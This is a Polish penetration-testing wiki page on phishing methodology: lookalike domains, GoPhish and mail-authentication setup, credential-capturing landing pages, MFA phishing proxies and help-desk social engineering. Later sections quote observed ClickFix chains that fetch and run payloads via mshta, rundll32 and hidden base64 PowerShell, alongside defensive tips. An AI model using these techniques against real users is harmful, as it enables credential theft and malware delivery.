# Metodologia Phishingu

## Metodologia

1. Przeprowadź rekonesans ofiary
1. Wybierz **domenę ofiary**.
2. Przeprowadź podstawową enumerację sieci web, **wyszukując portale logowania** używane przez ofiarę, i **zdecyduj**, który z nich będziesz **imitować**.
3. Wykorzystaj **OSINT**, aby **znaleźć adresy e-mail**.
2. Przygotuj środowisko
1. **Kup domenę**, której zamierzasz użyć podczas oceny phishingowej
2. **Skonfiguruj rekordy związane z usługą e-mail** (SPF, DMARC, DKIM, rDNS)
3. Skonfiguruj VPS za pomocą **gophish**
3. Przygotuj kampanię
1. Przygotuj **szablon e-maila**
2. Przygotuj **stronę webową** do kradzieży danych uwierzytelniających
4. Uruchom kampanię!

## Generowanie podobnych nazw domen lub zakup zaufanej domeny

### Techniki wariantów nazw domen

- **Słowo kluczowe**: Nazwa domeny **zawiera** ważne **słowo kluczowe** oryginalnej domeny (np. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Podomena z łącznikiem**: Zmień **kropkę na łącznik** w podomenie (np. www-zelster.com).
- **Nowe TLD**: Ta sama domena z użyciem **nowego TLD** (np. zelster.org)
- **Homoglyph**: **Zastępuje** literę w nazwie domeny **literami, które wyglądają podobnie** (np. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transpozycja:** **Zamienia miejscami dwie litery** w nazwie domeny (np. zelsetr.com).
- **Liczba pojedyncza/mnoga**: Dodaje lub usuwa „s” na końcu nazwy domeny (np. zeltsers.com).
- **Pominięcie**: **Usuwa jedną** z liter nazwy domeny (np. zelser.com).
- **Powtórzenie:** **Powtarza jedną** z liter nazwy domeny (np. zeltsser.com).
- **Zastąpienie**: Podobne do homoglyph, ale mniej skryte. Zastępuje jedną z liter nazwy domeny, na przykład literą znajdującą się blisko oryginalnej litery na klawiaturze (np. zektser.com).
- **Dodanie podomeny**: Wprowadza **kropkę** wewnątrz nazwy domeny (np. ze.lster.com).
- **Wstawienie**: **Wstawia literę** do nazwy domeny (np. zerltser.com).
- **Brak kropki**: Dołącza TLD do nazwy domeny (np. zelstercom.com)

**Narzędzia automatyczne**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Strony internetowe**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że niektóre przechowywane lub przesyłane bity mogą zostać automatycznie odwrócone** z powodu różnych czynników, takich jak rozbłyski słoneczne, promieniowanie kosmiczne lub błędy sprzętowe.

Gdy koncepcja ta zostanie **zastosowana do żądań DNS**, możliwe jest, że **domena otrzymana przez serwer DNS** nie będzie taka sama jak domena początkowo żądana.

Na przykład pojedyncza modyfikacja bitu w domenie „windows.com” może zmienić ją na „windnws.com”.

Atakujący mogą **wykorzystać tę sytuację, rejestrując wiele domen wykorzystujących bitflipping**, które są podobne do domeny ofiary. Ich zamiarem jest przekierowanie legalnych użytkowników do własnej infrastruktury.

Więcej informacji można znaleźć na stronie [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Zakup zaufanej domeny

Na stronie [https://www.expireddomains.net/](https://www.expireddomains.net) możesz wyszukać wygasłą domenę, której można użyć.\
Aby upewnić się, że wygasła domena, którą zamierzasz kupić, **ma już dobre SEO**, możesz sprawdzić, jak jest kategoryzowana w:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Wyszukiwanie adresów e-mail

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (w 100% darmowe)
- [https://phonebook.cz/](https://phonebook.cz) (w 100% darmowe)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **znaleźć więcej** prawidłowych adresów e-mail lub **zweryfikować te**, które zostały już znalezione, możesz sprawdzić, czy da się przeprowadzić brute-force na serwerach SMTP ofiary. [Tutaj dowiesz się, jak weryfikować/znajdować adresy e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto pamiętaj, że jeśli użytkownicy korzystają z **jakiegokolwiek portalu webowego do uzyskiwania dostępu do poczty**, możesz sprawdzić, czy jest on podatny na **brute force nazw użytkowników**, i w miarę możliwości wykorzystać tę podatność.

## Konfigurowanie GoPhish

### Instalacja

Możesz pobrać go ze strony [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz go, rozpakuj w `/opt/gophish` i wykonaj `/opt/gophish/gophish`\
W danych wyjściowych otrzymasz hasło użytkownika administratora na porcie 3333. Uzyskaj zatem dostęp do tego portu i użyj tych danych uwierzytelniających, aby zmienić hasło administratora. Może być konieczne przekierowanie tego portu lokalnie:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed wykonaniem tego kroku powinieneś **już kupić domenę**, której zamierzasz używać, i musi ona **wskazywać** na **adres IP VPS**, na którym konfigurujesz **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracja poczty**

Rozpocznij instalację: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień również wartości następujących zmiennych w pliku /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na koniec zmodyfikuj pliki **`/etc/hostname`** i **`/etc/mailname`**, ustawiając w nich nazwę swojej domeny, a następnie **zrestartuj VPS.**

Teraz utwórz **rekord DNS A** dla `mail.<domain>`, wskazujący na **adres IP** VPS, oraz **rekord DNS MX**, wskazujący na `mail.<domain>`.

Teraz przetestujmy wysyłanie wiadomości e-mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Konfiguracja Gophish**

Zatrzymaj wykonywanie Gophish i skonfigurujmy go.\
Zmodyfikuj `/opt/gophish/config.json` w następujący sposób (zwróć uwagę na użycie https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfiguracja usługi gophish**

Aby utworzyć usługę gophish, tak aby mogła być automatycznie uruchamiana i zarządzana jako usługa, możesz utworzyć plik `/etc/init.d/gophish` z następującą zawartością:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Dokończ konfigurację usługi i sprawdź ją, wykonując:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurowanie serwera pocztowego i domeny

### Poczekaj i zachowaj wiarygodność

Im starsza jest domena, tym mniejsze jest prawdopodobieństwo, że zostanie oznaczona jako spam. Dlatego przed przeprowadzeniem oceny phishingowej należy odczekać możliwie długo (co najmniej 1 tydzień). Ponadto, jeśli umieścisz na niej stronę dotyczącą sektora cieszącego się dobrą reputacją, uzyskana reputacja będzie lepsza.

Pamiętaj, że nawet jeśli musisz odczekać tydzień, możesz już teraz zakończyć konfigurowanie wszystkiego.

### Skonfiguruj rekord Reverse DNS (rDNS)

Ustaw rekord rDNS (PTR), który będzie rozwiązywał adres IP VPS do nazwy domeny.

### Rekord Sender Policy Framework (SPF)

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz użyć strony [https://www.spfwizard.net/](https://www.spfwizard.net), aby wygenerować swoją politykę SPF (użyj adresu IP serwera VPS).

![Formularz SPF Wizard do generowania rekordu SPF dla domeny phishingowej](<../../images/image (1037).png>)

To jest zawartość, którą należy ustawić w rekordzie TXT domeny:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Oparta na domenie autoryzacja, raportowanie i zgodność wiadomości (DMARC) — rekord

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Musisz utworzyć nowy rekord DNS TXT wskazujący hostname `_dmarc.<domain>` z następującą zawartością:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ten poradnik bazuje na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Musisz połączyć obie wartości B64 wygenerowane przez klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Sprawdź ocenę konfiguracji swojej poczty e-mail

Możesz to zrobić za pomocą [https://www.mail-tester.com/](https://www.mail-tester.com)\
Po prostu otwórz stronę i wyślij wiadomość e-mail na podany przez nich adres:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Możesz również **sprawdzić konfigurację poczty e-mail**, wysyłając wiadomość e-mail na adres `check-auth@verifier.port25.com` i **odczytując odpowiedź** (w tym celu musisz **otworzyć** port **25** i sprawdzić odpowiedź w pliku _/var/mail/root_, jeśli wyślesz wiadomość jako root).\
Sprawdź, czy przechodzisz wszystkie testy:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Możesz również wysłać **wiadomość do Gmaila, nad którym masz kontrolę**, a następnie sprawdzić **nagłówki wiadomości e-mail** w swojej skrzynce odbiorczej Gmaila — `dkim=pass` powinno znajdować się w polu nagłówka `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Usuwanie z czarnej listy Spamhouse

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Twoja domena jest blokowana przez spamhouse. Możesz poprosić o usunięcie swojej domeny/IP pod adresem: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Usuwanie z czarnej listy Microsoft

​​Możesz poprosić o usunięcie swojej domeny/IP pod adresem [https://sender.office.com/](https://sender.office.com).

## Tworzenie i uruchamianie kampanii GoPhish

### Profil wysyłania

- Ustaw **nazwę identyfikującą** profil nadawcy
- Zdecyduj, z którego konta będziesz wysyłać phishingowe wiadomości e-mail. Sugestie: _noreply, support, servicedesk, salesforce..._
- Możesz pozostawić pola nazwy użytkownika i hasła puste, ale upewnij się, że zaznaczono opcję Ignore Certificate Errors

![Tworzenie i uruchamianie kampanii GoPhish - Profil wysyłania: Możesz pozostawić pola nazwy użytkownika i hasła puste, ale upewnij się, że zaznaczono opcję Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Zaleca się użycie funkcji "**Send Test Email**", aby sprawdzić, czy wszystko działa.\
> Zalecam **wysłanie testowych wiadomości e-mail na adresy 10min mail**, aby uniknąć trafienia na czarną listę podczas przeprowadzania testów.

### Szablon wiadomości e-mail

- Ustaw **nazwę identyfikującą** szablon
- Następnie wpisz **temat** (nic dziwnego, po prostu coś, czego można by się spodziewać w zwykłej wiadomości e-mail)
- Upewnij się, że zaznaczono opcję "**Add Tracking Image**"
- Napisz **szablon wiadomości e-mail** (możesz używać zmiennych, jak w poniższym przykładzie):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Zauważ, że **w celu zwiększenia wiarygodności wiadomości e-mail** zaleca się użycie sygnatury z wiadomości e-mail klienta. Sugestie:

- Wyślij wiadomość e-mail na **nieistniejący adres** i sprawdź, czy odpowiedź zawiera sygnaturę.
- Wyszukaj **publiczne adresy e-mail**, takie jak info@ex.com, press@ex.com lub public@ex.com, wyślij na nie wiadomość i poczekaj na odpowiedź.
- Spróbuj skontaktować się z **którymś z odkrytych prawidłowych** adresów e-mail i poczekaj na odpowiedź

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template umożliwia również **dołączanie plików do wysłania**. Jeśli chcesz także kraść wyzwania NTLM za pomocą specjalnie spreparowanych plików/dokumentów, [przeczytaj tę stronę](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Ustaw **nazwę**
- **Wpisz kod HTML** strony internetowej. Pamiętaj, że możesz **importować** strony internetowe.
- Zaznacz **Capture Submitted Data** oraz **Capture Passwords**
- Ustaw **przekierowanie**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Zwykle trzeba będzie zmodyfikować kod HTML strony i przeprowadzić kilka testów lokalnie (na przykład za pomocą serwera Apache), **aż uzyskasz zadowalający rezultat.** Następnie wklej ten kod HTML w polu.\
> Pamiętaj, że jeśli potrzebujesz **użyć zasobów statycznych** dla HTML (na przykład stron CSS i JS), możesz zapisać je w _**/opt/gophish/static/endpoint**_, a następnie uzyskać do nich dostęp przez _**/static/\<filename>**_

> [!TIP]
> W przypadku przekierowania możesz **przekierować użytkowników do legalnej głównej strony internetowej** ofiary albo na przykład przekierować ich do _/static/migration.html_, umieścić tam **obracające się kółko (**[**https://loading.io/**](https://loading.io)**) na 5 sekund, a następnie wyświetlić informację, że proces zakończył się pomyślnie**.

### Users & Groups

- Ustaw nazwę
- **Zaimportuj dane** (pamiętaj, że aby użyć szablonu w tym przykładzie, potrzebujesz imienia, nazwiska i adresu e-mail każdego użytkownika)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Na koniec utwórz kampanię, wybierając nazwę, Email Template, Landing Page, URL, Sending Profile oraz grupę. Pamiętaj, że URL będzie linkiem wysyłanym ofiarom.

Pamiętaj, że **Sending Profile umożliwia wysłanie testowej wiadomości e-mail, aby sprawdzić, jak będzie wyglądać końcowa wiadomość phishingowa**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

Gdy wszystko będzie gotowe, uruchom kampanię!

## Klonowanie stron internetowych

Jeśli z jakiegoś powodu chcesz sklonować stronę internetową, sprawdź następującą stronę:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumenty i pliki zawierające backdoora

W niektórych assessmentach phishingowych (głównie w przypadku Red Teams) możesz również chcieć **wysyłać pliki zawierające pewnego rodzaju backdoor** (na przykład C2 albo po prostu coś, co wywoła uwierzytelnianie).\
Przykłady znajdziesz na następującej stronie:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Przez Proxy MitM

Poprzedni atak jest dość sprytny, ponieważ imitujesz prawdziwą stronę internetową i gromadzisz informacje wprowadzone przez użytkownika. Niestety, jeśli użytkownik nie podał prawidłowego hasła albo jeśli imitowana aplikacja jest skonfigurowana z 2FA, **te informacje nie pozwolą ci podszyć się pod oszukanego użytkownika**.

W tym miejscu przydatne są narzędzia takie jak [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) oraz [**muraena**](https://github.com/muraenateam/muraena). Narzędzie to umożliwia przeprowadzenie ataku typu MitM. Zasadniczo atak działa w następujący sposób:

1. **Imitujesz formularz logowania** prawdziwej strony internetowej.
2. Użytkownik **wysyła** swoje **dane uwierzytelniające** na twoją fałszywą stronę, a narzędzie przesyła je do prawdziwej strony, **sprawdzając, czy dane uwierzytelniające działają**.
3. Jeśli konto jest skonfigurowane z **2FA**, strona MitM poprosi o kod, a gdy **użytkownik go wprowadzi**, narzędzie prześle go do prawdziwej strony internetowej.
4. Po uwierzytelnieniu użytkownika ty (jako atakujący) będziesz mieć **przechwycone dane uwierzytelniające, 2FA, cookie oraz wszelkie informacje** z każdej interakcji użytkownika podczas działania narzędzia w trybie MitM.

### Przez VNC

Co, jeśli zamiast **wysyłać ofiarę na złośliwą stronę** wyglądającą tak samo jak oryginalna, przekierujesz ją do **sesji VNC z przeglądarką połączoną z prawdziwą stroną internetową**? Będziesz mógł obserwować jej działania, wykraść hasło, użyte MFA, cookie...\
Możesz to zrobić za pomocą [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Wykrywanie wykrywania

Oczywiście jednym z najlepszych sposobów sprawdzenia, czy zostałeś wykryty, jest **wyszukanie swojej domeny na czarnych listach**. Jeśli znajduje się na liście, oznacza to, że w jakiś sposób twoja domena została wykryta jako podejrzana.\
Jednym z prostych sposobów sprawdzenia, czy twoja domena znajduje się na którejś czarnej liście, jest użycie [https://malwareworld.com/](https://malwareworld.com)

Istnieją jednak inne sposoby sprawdzenia, czy ofiara **aktywnie poszukuje podejrzanej aktywności phishingowej w internecie**, jak wyjaśniono na stronie:


{{#ref}}
detecting-phising.md
{{#endref}}

Możesz **kupić domenę o bardzo podobnej nazwie** do domeny ofiary **i/lub wygenerować certyfikat** dla **subdomeny** kontrolowanej przez ciebie domeny, **zawierającej** **słowo kluczowe** z domeny ofiary. Jeśli **ofiara** wykona jakąkolwiek **interakcję DNS lub HTTP** z tymi elementami, będziesz wiedzieć, że **aktywnie poszukuje** podejrzanych domen i musisz zachować dużą ostrożność.<sup>[[2]](#references)</sup>

### Ocena phishingu

Użyj narzędzia [**Phishious** ](https://github.com/Rices/Phishious), aby ocenić, czy twoja wiadomość e-mail trafi do folderu spamu, zostanie zablokowana, czy też zakończy się powodzeniem.

## High-Touch Identity Compromise (reset MFA przez Help-Desk)

Współczesne grupy intruzów coraz częściej całkowicie pomijają przynęty e-mailowe i **bezpośrednio atakują procesy service-desk / odzyskiwania tożsamości**, aby obejść MFA. Atak w całości opiera się na zasadzie „living-off-the-land”: gdy operator zdobędzie prawidłowe dane uwierzytelniające, przemieszcza się za pomocą wbudowanych narzędzi administracyjnych – nie jest wymagane żadne malware.<sup>[[6]](#references)</sup>

### Przebieg ataku
1. Rozpoznanie ofiary
* Zbieranie danych osobowych i firmowych z LinkedIn, data breaches, publicznego GitHub itd.
* Identyfikacja tożsamości o wysokiej wartości (kadra zarządzająca, IT, finanse) oraz ustalenie **dokładnego procesu Help-Desk** dotyczącego resetowania hasła / MFA.
2. Inżynieria społeczna w czasie rzeczywistym
* Telefonowanie, kontakt przez Teams lub czat z Help-Desk przy jednoczesnym podszywaniu się pod cel (często za pomocą **sfałszowanego caller-ID** lub **sklonowanego głosu**).
* Podanie wcześniej zebranych danych PII w celu przejścia weryfikacji opartej na wiedzy.
* Przekonanie pracownika do **zresetowania sekretu MFA** lub wykonania **SIM-swap** zarejestrowanego numeru telefonu komórkowego.
3. Natychmiastowe działania po uzyskaniu dostępu (≤60 min w rzeczywistych przypadkach)
* Uzyskanie przyczółka przez dowolny portal web SSO.
* Enumeracja AD / AzureAD za pomocą wbudowanych narzędzi (bez zrzucania binariów):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ruch boczny za pomocą **WMI**, **PsExec** lub legalnych agentów **RMM**, które zostały już umieszczone na whitelist w środowisku.

### Wykrywanie i ograniczanie ryzyka
* Traktuj odzyskiwanie tożsamości przez Help-Desk jako **operację uprzywilejowaną** – wymagaj step-up auth i akceptacji menedżera.
* Wdróż reguły **Identity Threat Detection & Response (ITDR)** / **UEBA**, które będą generować alerty w przypadku:
* Zmiany metody MFA + uwierzytelnienia z nowego urządzenia / lokalizacji geograficznej.
* Natychmiastowego podniesienia uprawnień tego samego principal (user-→-admin).
* Nagrywaj rozmowy z Help-Desk i wymagaj **oddzwonienia na wcześniej zarejestrowany numer** przed wykonaniem resetu.
* Wdróż **Just-In-Time (JIT) / Privileged Access**, aby świeżo zresetowane konta **nie dziedziczyły automatycznie tokenów o wysokich uprawnieniach**.

---

## Deception na dużą skalę – SEO Poisoning i kampanie „ClickFix”
Grupy wykorzystujące commodity malware kompensują koszt operacji wymagających bezpośredniego kontaktu za pomocą masowych ataków, które zmieniają **wyszukiwarki i sieci reklamowe w kanał dostarczania**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** umieszcza fałszywy wynik, taki jak `chromium-update[.]site`, na szczycie reklam w wynikach wyszukiwania.
2. Ofiara pobiera niewielki **loader pierwszego etapu** (często JS/HTA/ISO). Przykłady zaobserwowane przez Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader eksfiltruje cookie przeglądarki i bazy danych danych uwierzytelniających, a następnie pobiera **cichy loader**, który w czasie rzeczywistym decyduje, czy wdrożyć:
* RAT (np. AsyncRAT, RustDesk)
* ransomware / wiper
* komponent persistence (klucz Run w rejestrze + scheduled task)

### Wskazówki dotyczące hardeningu
* Blokuj nowo zarejestrowane domeny i wymuszaj **Advanced DNS / URL Filtering** również dla *search-ads*, a nie tylko dla poczty e-mail.
* Ogranicz instalowanie oprogramowania do podpisanych pakietów MSI / Store; blokuj wykonywanie `HTA`, `ISO` i `VBS` za pomocą polityk.
* Monitoruj procesy potomne przeglądarek otwierające instalatory:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Wyszukuj LOLBins często nadużywane przez loadery pierwszego etapu (np. `regsvr32`, `curl`, `mshta`).

### Przejęcie kliknięcia przycisku pobierania z przekazaniem do TDS
Niektóre fałszywe portale z oprogramowaniem pozostawiają widoczny `href` pobierania wskazujący na **prawdziwy adres URL GitHub/release**, ale przechwytują **pierwszą** interakcję użytkownika w JavaScript i zamiast tego przekierowują ofiarę do łańcucha **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Kluczowe cechy:
- Hook zwykle uruchamia się w **capture phase** (`true`) na obiekcie `document`, dzięki czemu jest wykonywany przed handlerami witryny.
- Chrome często używa `mousedown` zamiast `click`, aby utrzymać przekierowanie powiązane z prawidłowym **user gesture** i zwiększyć skuteczność omijania blokad popupów.
- Niektóre warianty wcześniej otwierają `about:blank` lub wywołują kliknięcia syntetycznych elementów `<a target="_blank">`, a dopiero później przypisują URL TDS.
- Limity po stronie przeglądarki często znajdują się w `localStorage`, więc **pierwsze kliknięcie** może prowadzić do malware, podczas gdy odświeżenia i ponowne próby przechodzą do wyglądającego wiarygodnie widocznego linku.
- TDS może filtrować ruch na podstawie referrera, domeny wejściowej, GEO, fingerprintu przeglądarki/urządzenia, kontroli VPN/datacenter, kontekstu kliknięcia i liczników dla poszczególnych sesji, przez co powtórzenia analityków są niedeterministyczne.

Pomysły dla obrońców:
- Porównuj wyświetlany `href` z rzeczywistym celem nawigacji wygenerowanym w momencie kliknięcia.
- Wyszukuj handlery `document.addEventListener(..., true)`, które w pobliżu `window.open`, `about:blank` lub syntetycznych kliknięć anchorów wywołują zarówno `preventDefault()`, jak i `stopImmediatePropagation()`.
- Traktuj klastry nowo zarejestrowanych domen służących do pobierania oprogramowania, które wszystkie ładują ten sam etap CloudFront/JS, jako silny sygnał wzorca SEO-poisoning/TDS.

### ClickFix z fałszywych stron weryfikacyjnych + fetches LOLBAS wyglądające jak archiwa
Niektóre gałęzie TDS kończą się na fałszywej stronie weryfikacyjnej (w stylu Cloudflare/IUAM), która instruuje ofiarę, aby uruchomiła zaufany plik binarny Windows, taki jak:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notatki:
- `mshta.exe` wykonuje **HTA/VBScript na początku odpowiedzi**, nawet jeśli URL udaje archiwum `.7z`; dołączone dane archiwum mogą być wyłącznie przynętą.
- Kolejne etapy często nadal wprowadzają w błąd co do typu pliku (`.rtf` dla PowerShell, `.asar` dla Python, ZIP-y z dopełnionymi binariami), a następnie przechodzą do **ręcznego mapowania PE / wykonywania w pamięci**.
- Jeśli analizujesz jeden z tych łańcuchów, zachowaj **sieć + pamięć od pierwszego udanego uruchomienia**: późniejsze powtórzenia mogą pokazywać wyłącznie nieszkodliwą ścieżkę instalatora/SFX albo kończyć się niepowodzeniem, ponieważ wydanie payloadu/klucza było powiązane z pierwotną sesją TDS.

### Techniki dostarczania DLL przez ClickFix (fałszywa aktualizacja CERT)
* Przynęta: sklonowany komunikat krajowego CERT z przyciskiem **Update**, który wyświetla instrukcje „naprawy” krok po kroku. Ofiary są instruowane, aby uruchomić batch pobierający DLL i wykonujący ją za pomocą `rundll32`.<sup>[[12]](#references)</sup>
* Typowy zaobserwowany łańcuch batch:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` zapisuje payload w `%TEMP%`, krótkie opóźnienie ukrywa zmienność opóźnień sieciowych, a następnie `rundll32` wywołuje wyeksportowany entrypoint (`notepad`).
* DLL wysyła beacon z informacjami o tożsamości hosta i odpytuje C2 co kilka minut. Zdalne tasking przychodzi jako **zakodowany w base64 PowerShell**, wykonywany w ukryciu i z ominięciem zasad:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Zachowuje to elastyczność C2 (serwer może zmieniać zadania bez aktualizowania DLL) i ukrywa okna konsoli. Wyszukuj procesy potomne PowerShell uruchomione przez `rundll32.exe`, w których razem występują `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
